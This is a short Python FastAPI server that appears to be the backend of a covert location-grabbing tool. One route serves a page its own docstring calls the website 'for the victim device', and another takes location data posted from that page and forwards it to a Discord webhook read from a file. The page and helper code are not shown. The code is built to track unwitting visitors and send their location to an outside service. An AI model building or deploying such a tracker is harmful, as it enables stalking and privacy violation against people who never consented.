#!/usr/bin/env python3
"""
Purpose: will handle the fast api requests.
"""
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from utils import get_file_data, update_webhook

DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
HTML_FILE_NAME = "index_new.html"
web_app = FastAPI()


@web_app.get("/", response_class=HTMLResponse)
def get_website():
    """
    gets the regular website for the victim device
    """
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return html_data


@web_app.post("/location_update")
async def update_location(data: dict):
    """
    handles the location update of the program from the client side
    """
    discord_webhook = ""
    try:
        discord_webhook = get_file_data(DISCORD_WEBHOOK_FILE_NAME)
    except FileNotFoundError:
        pass
    update_webhook(discord_webhook, data)
    return "OK"
